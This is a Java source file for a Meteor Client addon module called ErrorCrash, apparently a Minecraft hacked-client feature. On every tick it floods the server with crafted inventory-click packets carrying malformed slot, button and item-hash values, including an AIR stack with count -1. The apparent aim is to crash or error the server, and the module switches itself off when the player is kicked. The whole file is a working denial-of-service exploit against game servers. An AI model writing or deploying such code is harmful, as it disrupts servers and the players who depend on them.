package com.example.addon.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import com.example.addon.AddonTemplate;
import net.minecraft.screen.sync.ComponentChangesHash;
import net.minecraft.screen.sync.ItemStackHash;

public class ErrorCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("Packets per tick")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public ErrorCrash() {
        super(AddonTemplate.CATEGORY, "error-crash", "error crash");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
        REAL.put(0, new ItemStack(Items.RED_DYE, 1));
        Int2ObjectMap<ItemStackHash> Fake = new Int2ObjectArrayMap<>();
        Fake.put(0, ItemStackHash.fromItemStack(new ItemStack(Items.AIR, -1),mc.player.networkHandler.getComponentHasher()));
        for (int i = 0; i < amount.get(); i++) {
            mc.getNetworkHandler().sendPacket(
                new ClickSlotC2SPacket(
                    mc.player.currentScreenHandler.syncId,
                    123344,
                    (short) 2957234,
                    (byte) 2859623,
                    SlotActionType.PICKUP,
                    Fake,
                    ItemStackHash.EMPTY
                )
            );
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
